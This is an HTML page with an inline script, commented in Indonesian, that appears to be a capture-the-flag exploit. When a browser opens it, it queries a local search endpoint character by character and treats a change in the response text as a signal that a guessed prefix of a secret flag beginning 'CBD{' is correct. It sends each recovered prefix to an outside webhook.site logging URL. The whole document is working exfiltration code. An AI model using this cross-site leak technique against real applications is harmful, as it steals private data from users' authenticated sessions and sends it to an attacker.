<!DOCTYPE html>
<html>
<body>
<script>
const TARGET = "http://127.0.0.1/search?q=";
const LOGGER = "https://webhook.site/a40b633a-f128-4f03-aaba-0122b02d749c";
const ALPHABET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_";

// kirim progress ke webhook
function log(msg) {
  fetch(LOGGER + "?d=" + encodeURIComponent(msg)).catch(()=>{});
}

// cek apakah prefix menghasilkan hasil
async function check(prefix) {
  try {
    const res = await fetch(TARGET + encodeURIComponent(prefix));
    const text = await res.text();

    // ini kunci: beda response
    return !text.includes("No visible PDF matched");
  } catch (e) {
    return false;
  }
}

async function solve(prefix) {
  log("progress: " + prefix);

  for (const c of ALPHABET) {
    const attempt = prefix + c;
    const ok = await check(attempt);

    if (ok) {
      log("found: " + attempt);

      if (c === '}') {
        log("FLAG: " + attempt);
        return;
      }

      await solve(attempt);
      return;
    }
  }
}

// mulai dari prefix flag
solve("CBD{");
</script>
</body>
</html>
